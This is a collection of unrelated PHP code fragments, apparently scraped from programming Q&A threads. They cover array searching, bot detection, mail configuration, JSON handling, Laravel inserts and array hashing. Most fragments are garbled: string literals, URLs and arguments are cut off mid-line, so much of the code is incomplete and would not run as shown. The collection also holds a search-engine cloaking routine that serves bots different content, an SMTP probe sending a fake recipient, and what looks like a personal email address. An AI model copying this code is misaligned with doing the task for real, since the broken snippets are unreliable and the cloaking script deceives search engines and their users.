$call = $call_type = $call_args = array( ); $response = $provider_api->api( $call, $call_type, $call_args );
$call = $call_type = $call_args = array( ); $response = $provider_api->api( $call, $call_type, $call_args );
$call = $call_args = array( ); $response = $providers[
$connection = new TwitterOAuth( "MY_CK" , "MY_CS" );
using (var client = new HttpClient()) { client.BaseAddress = new Uri("https: client.DefaultRequestHeaders.Accept.Clear(); client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json")); client.DefaultRequestHeaders.Add("Authorization", "Bearer **** YOUR BEARER TOKEN GOES HERE ****"); var response = client.GetAsync("statuses/user_timeline.json?count=10&screen_name=username").Result; if (!response.IsSuccessStatusCode) { return result; } var items = response.Content.ReadAsAsync<IEnumerable<dynamic>>().Result; foreach (dynamic item in items) { } }
$a= array( ); print_r( preg_grep( "/ONe/i" , $a ) );
function in_arrayi($needle, $haystack) { return in_array(strtolower($needle), array_map( }
function in_arrayi($needle, $haystack) { return in_array(strtolower($needle), array_map( }
foreach($searchKey as $key => $subkey) { if (in_array(strtolower($subkey), array_map("strtolower", $subarray))) { echo "found"; } }
foreach($searchKey as $key => $subkey) { if (in_array("$subkey", $subarray)) { echo "found"; } }
class StringHelper { public static function toLower($string, $encoding = { return mb_strtolower($string, $encoding); } /** * Digs into all levels of an array and converts all string values to lowercase */ public static function arrayToLower($array) { foreach ($array as &$value) { switch (true) { case is_string($value): $value = self::toLower($value); break; case is_array($value): $value = self::arrayToLower($value); break; } } return $array; } /** * Works like the built-in PHP in_array() function — Checks if a value exists in an array, but * gives the option to choose how the comparison is done - case-sensitive or case-insensitive */ public static function inArray($needle, $haystack, $case = { switch ($case) { default: case case return in_array($needle, $haystack, $strict); break; case case if (is_array($needle)) { return in_array(self::arrayToLower($needle), self::arrayToLower($haystack), $strict); } else { return in_array(self::toLower($needle), self::arrayToLower($haystack), $strict); } break; } } }
function in_array_insensitive($needle, $haystack) { $needle = strtolower($needle); foreach($haystack as $k => $v) { $haystack[$k] = strtolower($v); } return in_array($needle, $haystack); }
$a = [1 => $b = function checkArr($x,$array) { $arr = array_values($array); $arrlength = count($arr); $z = strtolower($x); for ($i = 0; $i < $arrlength; $i++) { if ($z == strtolower($arr[$i])) { echo "yes"; } } }; checkArr($b, $a);
/** * in_array function variant that performs case-insensitive comparison when needle is a string. * * @param mixed $needle * @param array $haystack * @param bool $strict * * @return bool */ function in_arrayi($needle, array $haystack, bool $strict = false): bool { if (is_string($needle)) { $needle = strtolower($needle); foreach ($haystack as $value) { if (is_string($value)) { if (strtolower($value) === $needle) { return true; } } } return false; } return in_array($needle, $haystack, $strict); } /** * in_array function variant that performs case-insensitive comparison when needle is a string. * Multibyte version. * * @param mixed $needle * @param array $haystack * @param bool $strict * @param string|null $encoding * * @return bool */ function mb_in_arrayi($needle, array $haystack, bool $strict = false, ?string $encoding = null): bool { if (null === $encoding) { $encoding = mb_internal_encoding(); } if (is_string($needle)) { $needle = mb_strtolower($needle, $encoding); foreach ($haystack as $value) { if (is_string($value)) { if (mb_strtolower($value, $encoding) === $needle) { return true; } } } return false; } return in_array($needle, $haystack, $strict); }
foreach($results as $result) { if (!$condition) { $halt = true; ErrorHandler::addErrorToStack( } doSomething(); } if (!$halt) { }
$arr = array( while (list(, $val) = each($arr)) { if ($val == break; } echo "$val<br />\n"; }
$person = "Rasmus Lerdorf"; $found = false; foreach($organization as $oKey=>$department) { foreach($department as $dKey=>$group) { foreach($group as $gKey=>$employee) { if ($employee[ { $found = true; break 3; } } } }
$arr = array( foreach ($arr as $val) { if ($val == break; } echo "$val<br />\n"; }
$arr = array( $length = count($arr); $found = false; for ($i = 0; $i < $length && !$found; $i++) { $val = $arr[$i]; if ($val == $found = true; } echo "$val<br />\n"; }
function _bot_detected() { return ( isset($_SERVER[ && preg_match( ); }
$interestingCrawlers = array( $pattern = $matches = array(); $numMatches = preg_match($pattern, strtolower($_SERVER[ if($numMatches > 0) { }
<?php function crawlerDetect($USER_AGENT) { $crawlers = array( ); $crawlers_agents = implode( if (strpos($crawlers_agents, $USER_AGENT) === false) return false; else { return TRUE; } } ?>
<?php $USER_AGENT = $_SERVER[ if(crawlerDetect($USER_AGENT)) return "no need to lang redirection";?>
public function isBot() { $bot_regex = $userAgent = empty($_SERVER[ $isBot = !$userAgent || preg_match($bot_regex, $userAgent); return $isBot; }
<?php if (CLOAKING_LEVEL != 4) { $lastupdated = date("Ymd", filemtime(FILE_BOTS)); if ($lastupdated != date("Ymd")) { $lists = array( ); foreach($lists as $list) { $opt .= fetch($list); } $opt = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $opt); $fp = fopen(FILE_BOTS,"w"); fwrite($fp,$opt); fclose($fp); } $ip = isset($_SERVER[ $ref = isset($_SERVER[ $agent = isset($_SERVER[ $host = strtolower(gethostbyaddr($ip)); $file = implode(" ", file(FILE_BOTS)); $exp = explode(".", $ip); $class = $exp[0]. $threshold = CLOAKING_LEVEL; $cloak = 0; if (stristr($host, "googlebot") && stristr($host, "inktomi") && stristr($host, "msn")) { $cloak++; } if (stristr($file, $class)) { $cloak++; } if (stristr($file, $agent)) { $cloak++; } if (strlen($ref) > 0) { $cloak = 0; } if ($cloak >= $threshold) { $cloakdirective = 1; } else { $cloakdirective = 0; } } ?>
$user_agent = strtolower($_SERVER[ if(!preg_match("/Googlebot|MJ12bot|yandexbot/i", $user_agent)){ if($user_agent!=""){ $myfile = fopen("useragent.txt", "a") or die("Unable to open file useragent.txt!"); fwrite($myfile, $user_agent); $user_agent = "\n"; fwrite($myfile, $user_agent); fclose($myfile); } }
Mozilla/5.0 (compatible; Googlebot/2.1; +http: Mozilla/5.0 (compatible; MJ12bot/v1.4.6; http: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http: mozilla/5.0 (compatible; yandexbot/3.0; +http: mozilla/5.0 (compatible; yandexbot/3.0; +http: mozilla/5.0 (compatible; yandexbot/3.0; +http: mozilla/5.0 (compatible; yandexbot/3.0; +http: mozilla/5.0 (iphone; cpu iphone os 9_3 like mac os x) applewebkit/601.1.46 (khtml, like gecko) version/9.0 mobile/13e198 safari/601.1 mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.143 safari/537.36 mozilla/5.0 (compatible; linkdexbot/2.2; +http: mozilla/5.0 (windows nt 6.1; wow64; rv:49.0) gecko/20100101 firefox/49.0 mozilla/5.0 (windows nt 6.1; wow64; rv:33.0) gecko/20100101 firefox/33.0 mozilla/5.0 (windows nt 6.1; wow64; rv:49.0) gecko/20100101 firefox/49.0 mozilla/5.0 (windows nt 6.1; wow64; rv:33.0) gecko/20100101 firefox/33.0 mozilla/5.0 (windows nt 6.1; wow64; rv:49.0) gecko/20100101 firefox/49.0 mozilla/5.0 (windows nt 6.1; wow64; rv:33.0) gecko/20100101 firefox/33.0 mozilla/5.0 (windows nt 6.1; wow64; rv:49.0) gecko/20100101 firefox/49.0 mozilla/5.0 (windows nt 6.1; wow64; rv:33.0) gecko/20100101 firefox/33.0 mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.143 safari/537.36 mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/53.0.2785.143 safari/537.36 mozilla/5.0 (compatible; baiduspider/2.0; +http: zoombot (linkbot 1.0 http: mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.155 safari/537.36 opr/31.0.1889.174 mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.155 safari/537.36 opr/31.0.1889.174 sogou web spider/4.0(+http: mozilla/5.0 (windows nt 10.0; wow64) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.155 safari/537.36 opr/31.0.1889.174
function bot_detected() { if(preg_match( return true; } else{ return false; } }
<?php $input = "Alien"; echo str_pad($input, 10); echo str_pad($input, 10, "-=", STR_PAD_LEFT); echo str_pad($input, 10, "_", STR_PAD_BOTH); echo str_pad($input, 6 , "___"); ?>
$start = microtime(true); for ($i=0;$i<100000;$i++) { str_pad(9,2, str_pad(15,2, str_pad(100,2, } $end = microtime(true); echo "Result str_pad : ",($end-$start),"\n"; $start = microtime(true); for ($i=0;$i<100000;$i++) { sprintf("%02d", 9); sprintf("%02d", 15); sprintf("%02d", 100); } $end = microtime(true); echo "Result sprintf : ",($end-$start),"\n";
$client = new Client([ $response = $client->post( ] ]); var_dump($response);
object(guzzlehttp\psr7\response) ["reasonphrase":"guzzlehttp\psr7\response":private]=> string(2) "ok" ["statuscode":"guzzlehttp\psr7\response":private]=> int(200) ["headers":"guzzlehttp\psr7\response":private]=> array(9) { ["connection"]=> array(1) { [0]=> string(10) "keep-alive" } ["server"]=> array(1) { [0]=> string(15) "gunicorn/19.3.0" } ["date"]=> array(1) { [0]=> string(29) "sat, 30 may 2015 17:22:41 gmt" } ["transfer-encoding"]=> array(1) { [0]=> string(7) "chunked" } ["content-type"]=> array(1) { [0]=> string(16) "application/json" } ["allow"]=> array(1) { [0]=> string(13) "post, options" } ["x-frame-options"]=> array(1) { [0]=> string(10) "sameorigin" } ["vary"]=> array(1) { [0]=> string(12) "cookie, host" } ["via"]=> array(1) { [0]=> string(9) "1.1 vegur" } } ["headerlines":"guzzlehttp\psr7\response":private]=> array(9) { ["connection"]=> array(1) { [0]=> string(10) "keep-alive" } ["server"]=> array(1) { [0]=> string(15) "gunicorn/19.3.0" } ["date"]=> array(1) { [0]=> string(29) "sat, 30 may 2015 17:22:41 gmt" } ["transfer-encoding"]=> array(1) { [0]=> string(7) "chunked" } ["content-type"]=> array(1) { [0]=> string(16) "application/json" } ["allow"]=> array(1) { [0]=> string(13) "post, options" } ["x-frame-options"]=> array(1) { [0]=> string(10) "sameorigin" } ["vary"]=> array(1) { [0]=> string(12) "cookie, host" } ["via"]=> array(1) { [0]=> string(9) "1.1 vegur" } } ["protocol":"guzzlehttp\psr7\response":private]=> string(3) "1.1" ["stream":"guzzlehttp\psr7\response":private]=> object(guzzlehttp\psr7\stream) ["stream":"guzzlehttp\psr7\stream":private]=> resource(40) of type (stream) ["size":"guzzlehttp\psr7\stream":private]=> null ["seekable":"guzzlehttp\psr7\stream":private]=> bool(true) ["readable":"guzzlehttp\psr7\stream":private]=> bool(true) ["writable":"guzzlehttp\psr7\stream":private]=> bool(true) ["uri":"guzzlehttp\psr7\stream":private]=> string(10) "php: ["custommetadata":"guzzlehttp\psr7\stream":private]=> array(0) { } } }
{ "data" : { "token" "fasdfasf-asfasdfasdf-sfasfasf" } }
$stream = $response->getBody(); $contents = $stream->getContents(); $contents = $stream->getContents(); $stream->rewind(); $contents = $stream->getContents();
$contents = (string) $response->getBody(); $contents = (string) $response->getBody();
$key = $value = NULL; foreach ($array as $key => $value) { break; } echo "$key = $value\n";
reset($array); list($key, $value) = each($array); echo "$key = $value\n";
$arr = array(1,2); current($arr); next($arr); current($arr); reset($arr); current($arr);
$arr[reset(array_keys($arr))]; reset(array_values($arr));
$value = $default; foreach(array_slice($arr, 0, 1) as $value);
foreach(array_slice($arr, 0, 1, true) as $key => $value);
foreach(array_slice($arr, -1, 1, true) as $key => $value);
if(is_array($array)) { reset($array); $first = key($array); }
<?php $large_array = array( var_dump(current($large_array)); ?>
<?php $large_array = array( $large_array_keys = array_keys($large_array); var_dump(array_shift($large_array_keys)); ?>
$a = array( ); $first = current($a); $last = end($a);
$first = (empty($array)) ? $default : $array[array_key_first($array)];
top : for each(var i:MovieClip in movieClipArray) { for each(var j:String in nameArray) { if(i.name == j) break top; } }
foreach(...) { foreach(...) { if(i.name == j) break 2; } }
foreach(...) { foreach(...) { if(i.name == j) goto top; } } top :
$i = new MovieClip(); foreach($movieClipArray as $i) { $nameArray = array(); foreach($nameArray as $n) if($i->name==$n) break 2; }
for($i=0,$j=50; $i<100; $i++) { while($j--) { if($j==17) goto end; } } echo "i = $i"; end: echo
"\u0411\u0430\u0437\u0430 \u0434\u0430\u043d\u043d\u0438 \u0433\u0440\u0435\u0448\u043a\u0430."
function raw_json_encode($input, $flags = 0) { $fails = implode( $flags & JSON_HEX_TAG ? $flags & JSON_HEX_AMP ? $flags & JSON_HEX_APOS ? $flags & JSON_HEX_QUOT ? ))); $pattern = "/\\\\(?:(?:$fails)(*SKIP)(*FAIL)|u([0-9a-fA-F]{4}))/"; $callback = function ($m) { return html_entity_decode("& }; return preg_replace_callback($pattern, $callback, json_encode($input, $flags)); }
$string =json_encode($input, JSON_UNESCAPED_UNICODE) ; echo $decoded = html_entity_decode( $string );
header( json_encode($data,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT);
function jsonRemoveUnicodeSequences( $json_struct ) { return preg_replace( "/\\\\u([a-f0-9]{4})/e", "iconv( }
foreach ($rows as $key => $row) { $rows[$key]["keyword"] = utf8_encode($row["keyword"]); } echo json_encode($rows);
$from = "someonelse@example.com"; $headers = "From:" . $from; echo mail ("borutflis1@gmail.com" ,"testmailfunction" , "Oj",$headers);
[mail function] ; For Win32 only. ; http: SMTP = localhost ; http: smtp_port = 25 ; For Win32 only. ; http: sendmail_from = someonelse@example.com
$mail = new PHPMailer(); $mail->IsSMTP(); $mail->CharSet = $mail->Host = "mail.example.com"; $mail->SMTPDebug = 0; $mail->SMTPAuth = true; $mail->Port = 25; $mail->Username = "username"; $mail->Password = "password";
sendmail_path = "/usr/bin/msmtp -C /path/to/your/config -t"
<?php ini_set("SMTP", "aspmx.l.google.com"); ini_set("sendmail_from", "YOURMAIL@gmail.com"); $message = "The mail message was sent with the following mail setting:\r\nSMTP = aspmx.l.google.com\r\nsmtp_port = 25\r\nsendmail_from = YourMail@address.com"; $headers = "From: YOURMAIL@gmail.com"; mail("Sending@provider.com", "Testing", $message, $headers); echo "Check your email now....<BR/>"; ?>
require_once "Mail.php"; $from = $to = $subject = $body = "Hello world! this is the content of the email"; $headers = array( ); $smtp = Mail::factory( )); $mail = $smtp->send($to, $headers, $body); if (PEAR::isError($mail)) { echo } else { echo }
defaults tls on tls_starttls on tls_trust_file /etc/ssl/certs/ca-certificates.crt account default host <smtp.example.net> port 587 auth on user <username@example.net> password <password> from <address-to-receive-bounces@example.net> syslog LOG_MAIL
{%if fields | length > 0 || trans_fields | length > 0 -%}
Unexpected token "punctuation" of value "|" ("name" expected) in
{% set count1 = fields | length %} {% set count2 = trans_fields | length %} {%if count1 > 0 || count2 > 0 -%}
{% set count1 = fields | length > 0 %} {% set count2 = trans_fields | length > 0 %} {%if count1 || count2 -%}
{%if ( fields | length > 0 ) or ( trans_fields | length > 0 ) %}
Expressions can be used in {% blocks %} and ${ expressions }. Operator Description == Does the left expression equal the right expression? + Convert both arguments into a number and add them. - Convert both arguments into a number and substract them. * Convert both arguments into a number and multiply them. / Convert both arguments into a number and divide them. % Convert both arguments into a number and calculate the rest of the integer division. ~ Convert both arguments into a string and concatenate them. or True if the left or the right expression is true. and True if the left and the right expression is true. not Negate the expression.
{% if (foo and bar) or (fizz and (foo + bar == 3)) %}
class Test { public function __construct($param) { $this->_var = $param; } public function myMethod() { return $this->_var * 2; } protected $_var; }
/** * @return Test */ function Test($param) { return new Test($param); }
(new foo())->bar() (new $foo())->bar (new $bar->y)->x (new foo)[0]
function identity($x) { return $x; } identity(new Obj)->method();
class ObjFactory{ public static function newObj(){ return new Obj(); } } ObjFactory::newObj()->method();
function convertDate($oldDateString,$newDateFormatString) { $d = new DateTime($oldDateString); return $d->format($newDateFormatString); } $myNewDate = convertDate($myOldDate,
<?php class test { function __call($func,$args) { echo "I am here - $func\n"; } } $a = new test(); $a->new( "My new class" ); ?>
... usual HTTP header ... Content-Length: 1039 Content-Type: text/plain 89c5fdataasdhf kajshfd akjshfksa hfdkjsa falkjshfsa ajshd fkjsahfd lkjsahflksahfdlkashfhsadkjfsalhfd ajshdfhsafiahfiuwhflsf this is just data from a string more data kjahfdhsakjfhsalkjfdhalksfd
$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "http: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt($ch, CURLOPT_POST, 1 ); curl_setopt($ch, CURLOPT_POSTFIELDS, "body goes here" ); curl_setopt($ch, CURLOPT_HTTPHEADER, array( $result=curl_exec ($ch);
addhttp("google.com"); addhttp("www.google.com"); addhttp("google.com"); addhttp("ftp: addhttp("https: addhttp("http: addhttp("rubbish");
function addhttp($url) { if (!preg_match("~^(?:f|ht)tps?: $url = "http: } return $url; }
function addScheme($url, $scheme = { return parse_url($url, PHP_URL_SCHEME) === null ? $scheme . $url : $url; } echo addScheme( echo addScheme(
function addhttp($url) { return $url = empty(parse_url($url)[ }
function addhttp($url) { if (!preg_match("@^https?: $url = "http: } return $url; }
<?php if (!preg_match("/^(http|ftp):/", $_POST[ $_POST[ } $url = $_POST[ ?>
function addhttp($url) { if (!preg_match("@^[hf]tt?ps?: $url = "http: } return $url; }
function isBoolean($value) { if ($value) { return true; } else { return false; } }
isBoolean("true") isBoolean("") isBoolean("false") isBoolean("asd")
$bool = filter_var($value, FILTER_VALIDATE_BOOLEAN);
function isBoolean($value) { if ($value && strtolower($value) !== "false") { return true; } else { return false; } }
function isBoolean($value) { if ($value === "true") { return true; } else { return false; } }
function isBoolean($value) { return $value === "true"; }
$str = "true"; $bool = !in_array($str, array("false", "", "0", "no", "off"));
function loosely_cast_to_boolean($value) { if(is_array($value) || $value instanceof Countable) { return (boolean) count($value); } else if(is_string($value) || is_object($value) && method_exists($value, $value = (string) $value; $filtered = filter_var($value, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE); if(!is_null($filtered)) { return $filtered; } else { if(strtolower($value) === $value = } return (boolean) $value; } } else { return (boolean) $value; } }
$flag = if( filter_var( $flag,FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE ) !== null) { $flag = filter_var($flag,FILTER_VALIDATE_BOOLEAN); } gettype($flag); echo
<?php error_reporting(E_ERROR | E_WARNING | E_PARSE); error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); error_reporting(E_ALL & ~E_NOTICE); error_reporting(E_ALL); error_reporting(-1); ini_set( ?>
<?php error_reporting(0); error_reporting(E_ERROR | E_WARNING | E_PARSE); error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); error_reporting(E_ALL & ~E_NOTICE); error_reporting(E_ALL); error_reporting(-1); ini_set( ?>
php -d error_reporting="E_ERROR | E_WARNING | E_PARSE"
$data = array( array( array( ); Coder::insert($data);
$data = array( array( ), array( ), ); Coder::insert($data);
$now = Carbon::now( $data = array( array( ), array( ), ); Coder::insert($data);
$now = Carbon::now( $data = array( array( ), array( ), ); Coder::insert($data);
/** * Create a Collection of new instances of the related model. * * @param array $records * @return \Illuminate\Database\Eloquent\Collection */ public function createMany(array $records) { $instances = $this->related->newCollection(); foreach ($records as $record) { $instances->push($this->create($record)); } return $instances; }
$allintests = []; foreach($intersts as $item){ $intestcat = new User_Category(); $intestcat->memberid = $item->memberid; $intestcat->catid= $item->catid; $allintests[] = $intestcat->attributesToArray(); } User_Category::insert($allintests);
$now = Carbon::now()->toDateTimeString(); Model::insert([ [ [ [ .................................. ]);
$start_date = date( $end_date = date( $user_subscription_array = array( array( array( ); dd(UserSubscription::insert($user_subscription_array));
$users = factory(App\User::class, 10)->make()->toArray(); App\User::insert($users);
<?php use App\Continent; use Illuminate\Database\Seeder; class InitialSeeder extends Seeder { /** * Run the database seeds. * * @return void */ public function run() { collect([ [ [ [ [ [ ])->each(function ($item, $key) { Continent::forceCreate($item); }); } }
<?php use App\Continent; use Carbon\Carbon; use Illuminate\Database\Seeder; class InitialSeeder extends Seeder { /** * Run the database seeds. * * @return void */ public function run() { $timestamp = Carbon::now(); $password = bcrypt( $continents = [ [ ], [ ], [ ], [ ], [ ], ]; Continent::insert($continents); } }
public function getCategorieenAsArray(){ $catList = array(); $query = "SELECT DISTINCT datasource_id, title FROM table"; if ($rs=C_DB::fetchRecordset($query)) { while ($row=C_DB::fetchRow($rs)) { if(!empty($row["title"])){ array_push($catList, $row["datasource_id"] ."=>". $row["title"] ); } } } return($catList); }
Array ( [0] => 1=>Categorie 1 [1] => 5=>Categorie 2 [2] => 2=>Caterorie 2 )
if (!empty($row["title"])) { $catList[$row["datasource_id"]] = $row["title"]; }
$new_row = array($row["datasource_id"]=>$row["title"]);
public static function convertIndexedArrayToAssociative($indexedArr, $keys) { $resArr = array(); foreach ($indexedArr as $item) { $tmpArr = array(); foreach ($item as $key=>$value) { $tmpArr[$keys[$key]] = $value; } $resArr[] = $tmpArr; } return $resArr; }
class line_details { var $commission_one=array(); foreach($_SESSION[ $row= explode( $this->commission_one[$row[ } }
CREATE TABLE Posts { id INT PRIMARY KEY AUTO_INCREMENT, title VARCHAR(200), url VARCHAR(200) }
<?php $sql=mysql_query("select * from Posts limit 20"); echo while($row=mysql_fetch_array($sql)) { $title=$row[ $url=$row[ echo ' { "title":" "url":" }, } echo ?>
<?php $sql="select * from Posts limit 20"; $response = array(); $posts = array(); $result=mysql_query($sql); while($row=mysql_fetch_array($result)) { $title=$row[ $url=$row[ $posts[] = array( } $response[ $fp = fopen( fwrite($fp, json_encode($response)); fclose($fp); ?>
$json_data = json_encode($posts); file_put_contents(
$array = array( $fp = fopen( fwrite($fp, json_encode($array, JSON_PRETTY_PRINT)); fclose($fp);
$jsonString = file_get_contents( $data = json_decode($jsonString, true);
$data[0][ foreach ($data as $key => $entry) { if ($entry[ $data[$key][ } }
$newJsonString = json_encode($data); file_put_contents(
$array = array( ); echo stripslashes(json_encode($array));
"123_String" -> "String" "233718_This_is_a_string" -> "This_is_a_string" "83_Another Example" -> "Another Example"
$data = "123_String"; $whatIWant = substr($data, strpos($data, "_") + 1); echo $whatIWant;
if (($pos = strpos($data, "_")) !== FALSE) { $whatIWant = substr($data, $pos+1); }
$s = 233718_This_is_a_string; $firstPart = strtok( $s, $allTheRest = strtok(
$s = "This_is_a_string_233718"; $text = $s."_".substr($s, 0, strrpos($s, "_"));
<?php $Amp = $IsXhtml ? $Parameters = array( $QueryString = foreach ($Parameters as $Key => $Value) $QueryString .= $Amp . $Key .
$p = Array("id"=>"blar","class"=>"myclass","onclick"=>"myJavascriptFunc()"); array_walk($p, create_function( $p_string = implode($p,"");
$str = json_encode($arr); [{"id":"123","name":"Ice"},{"id":"234","name":"Cake"},{"id":"345","name":"Pie"}]
<? $attributes = array( ); $dataAttributes = array_map(function($value, $key) { return $key. }, array_values($attributes), array_keys($attributes)); $dataAttributes = implode( ?> <div class="image-box" <?= $dataAttributes; ?> > <img src="http: </div>
function array_to_attributes ( $array_attributes ) { $attributes_str = NULL; foreach ( $array_attributes as $attribute => $value ) { $attributes_str .= " $attribute=\"$value\" "; } return $attributes_str; } $attributes = array( ); echo array_to_attributes($attributes) ;
$attrString = str_replace("+", " ", str_replace("&", "\" ", str_replace("=", "=\"", http_build_query($attrArray)))) . "\"";
$attrArray = array("id" => "email", "name" => "email", "type" => "email", "class" => "active large"); echo str_replace("+", " ", str_replace("&", "\" ", str_replace("=", "=\"", http_build_query($attrArray)))) . "\"";
$attributes = array( ); $args = ""; array_walk( $attributes, function ($item, $key) use (&$args) { $args .= $key ." = } );
public function implode_key($glue = "", $pieces = array()) { $keys = array_keys($pieces); return implode($glue, $keys); }
echo implode(",", array_keys($companies->toArray()));
<?php $string1 = "Hello"; $string2 = "Hello\x00World"; echo strcoll($string1, $string2); echo strcmp($string1, $string2); ?>
$arr = array(); array_push($arr, "stackoverflow"); print_r($arr);
for($i = 0; $i < 10; $i++){ array_push($arr, $i, $i*2, $i*3, $i*4, ...) }
for($i = 0; $i < 10; $i++){ $arr[] = $i; $arr[] = $i*2; $arr[] = $i*3; $arr[] = $i*4; ... }
dev dev 2013-09-12 3.1.14 beta 2013-01-02 3.1.9 stable 2011-05-14
dev/3.2 dev 2013-12-13 dev/3.1 dev 2013-11-05 3.1.0 stable 2013-10-10 3.0.4 stable 2013-10-10
dev dev 2012-08-16 0.9.6-rc1 unstable 2010-01-26 0.9.5.1 stable 2007-05-16
class Student extends Model { protected $fillable = [ }
class Student extends Model { protected $guarded = [ }
$smtp_server = fsockopen("STACKOVERFLOW.COM.S9A1.PSMTP.com", 25, $errno, $errstr, 30); fwrite($smtp_server, "helo hi\r\n"); fwrite($smtp_server, "mail from: <me@myhost.com>\r\n"); fwrite($smtp_server, "rcpt to: <fake@stackoverflow.com>\r\n");
function EmailValidation($email) { $email = htmlspecialchars(stripslashes(strip_tags($email))); if (eregi( $domain = explode( "@", $email ); if (@fsockopen ($domain[1],80,$errno,$errstr,3)) { echo "Domain Name is valid "; return true; } else { echo "Con not a email domian"; return false; } return false; } }
<?php $email = "someone@exa mple.com"; if(!filter_var($email, FILTER_VALIDATE_EMAIL)) echo "E-mail is not valid"; else echo "E-mail is valid"; ?>
bash-3.2 downloading pecl_http-1.7.1.tgz ... Starting to download pecl_http-1.7.1.tgz (174,098 bytes) .....................................done: 174,098 bytes 71 source files, building running: phpize Configuring for: PHP Api Version: 20090626 Zend Module Api No: 20090626 Zend Extension Api No: 220090626 Cannot find autoconf. Please check your autoconf installation and the $PHP_AUTOCONF environment variable. Then, rerun this script. ERROR: `phpize
curl -OL http: tar xzf autoconf-latest.tar.gz cd autoconf-* ./configure --prefix=/usr/local make sudo make install
sudo ln -s /usr/local/Cellar/autoconf/2.69/bin/autoconf /usr/bin/autoconf sudo ln -s /usr/local/Cellar/autoconf/2.69/bin/autoheader /usr/bin/autoheader
<?php $array = unserialize( $b4_s = microtime(1); for ($i=0;$i<10000;$i++) { $serial = md5(serialize($array)); } echo $b4_j = microtime(1); for ($i=0;$i<10000;$i++) { $serial = md5(json_encode($array)); } echo echo
$original = $array; array_multisort($array); $hash = md5(json_encode($array));
function array_md5(Array $array) { array_multisort($array); return md5(json_encode($array)); }
serialize() 1c4f1064ab79e4722f41ab5a8141b210 1ad0f2c7e690c8e3cd5c34f7c9b8573a json_encode() db7178ba34f9271bfca3a05c5dddf502 c9661c0852c2bd0e26ef7951b4ca9e6f Sorted serialize() 1c4f1064ab79e4722f41ab5a8141b210 1c4f1064ab79e4722f41ab5a8141b210 Sorted json_encode() db7178ba34f9271bfca3a05c5dddf502 db7178ba34f9271bfca3a05c5dddf502
md5( serialize(deep_ksort($array)) ); md5( json_encode(deep_ksort($array)) );
$a = array(); $a[ $a[ $b = array(); $b[ $b[ echo " serialize()\n"; echo md5(serialize($a))."\n"; echo md5(serialize($b))."\n"; echo "\n json_encode()\n"; echo md5(json_encode($a))."\n"; echo md5(json_encode($b))."\n"; $a = deep_ksort($a); $b = deep_ksort($b); echo "\n Sorted serialize()\n"; echo md5(serialize($a))."\n"; echo md5(serialize($b))."\n"; echo "\n Sorted json_encode()\n"; echo md5(json_encode($a))."\n"; echo md5(json_encode($b))."\n";
/* * Sort an array by keys, and additionall sort its array values by keys * * Does not try to sort an object, but does iterate its properties to * sort arrays in properties */ function deep_ksort($input) { if ( !is_object($input) && !is_array($input) ) { return $input; } foreach ( $input as $k=>$v ) { if ( is_object($v) || is_array($v) ) { $input[$k] = deep_ksort($v); } } if ( is_array($input) ) { ksort($input); } return $input; }
Test name Repeats Result Performance serialize 10000 0.761195 sec +0.00% print_r 10000 1.669689 sec -119.35% json_encode 10000 1.712214 sec -124.94% var_export 10000 1.735023 sec -127.93%
Test name Repeats Result Performance json_encode 10000 1.040612 sec +0.00% var_export 10000 1.753170 sec -68.47% serialize 10000 1.947791 sec -87.18% print_r 10000 9.084989 sec -773.04%
Class hasharray { public function array_flat($in,$keys=array(),$out=array()){ foreach($in as $k => $v){ $keys[] = $k; if(is_array($v)){ $out = $this->array_flat($v,$keys,$out); }else{ $out[implode("/",$keys)] = $v; } array_pop($keys); } return $out; } public function array_hash($in){ $a = $this->array_flat($in); ksort($a); return md5(json_encode($a)); } } $h = new hasharray; echo $h->array_hash($multi_dimensional_array);
$a = new \stdClass; $a->test = $b = new \stdClass; $b->one = $a; $b->two = clone $a;
"O:8:"stdClass":2:{s:3:"one";O:8:"stdClass":1:{s:4:"test";s:6:"sample";}s:3:"two";O:8:"stdClass":1:{s:4:"test";s:6:"sample";}}"
<?php $a = new \stdClass; $a->test = $b = new \stdClass; $b->one = $a; $b->two = $a;
"O:8:"stdClass":2:{s:3:"one";O:8:"stdClass":1:{s:4:"test";s:6:"sample";}s:3:"two";r:2;}"
$array = array(); array_walk_recursive($input, function ($a) use (&$array) { $array[] = $a; }); sort($array); $hash = md5(json_encode($array)); ---- These arrays have the same hash: $arr1 = array(0 => array(1, 2, 3), 1, 2); $arr2 = array(0 => array(1, 3, 2), 1, 2);
$a = array(new \stdClass()); $b = array(new \stdClass());
function replaceObjectsWithHashes(array $array) { foreach ($array as &$value) { if (is_array($value)) { $value = $this->replaceObjectsInArrayWithHashes($value); } elseif (is_object($value)) { $value = spl_object_hash($value); } } ksort($array); return $array; }
$arr1 = array( ksort($arr1); $arr2 = array( ksort($arr2); var_dump(sha1(json_encode($arr1))); var_dump(sha1(json_encode($arr2)));
string(40) "502c2cbfbe62e47eb0fe96306ecb2e6c7e6d014c" string(40) "b3319c58edadab3513832ceeb5d68bfce2fb3983"
$string =" foo I like php foo, but foo I also like asp foo, foo I feel hero foo";
function get_string_between($string, $start, $end){ $string = $ini = strpos($string, $start); if ($ini == 0) return $ini += strlen($start); $len = strpos($string, $end, $ini) - $ini; return substr($string, $ini, $len); } $fullstring = $parsed = get_string_between($fullstring, echo $parsed;
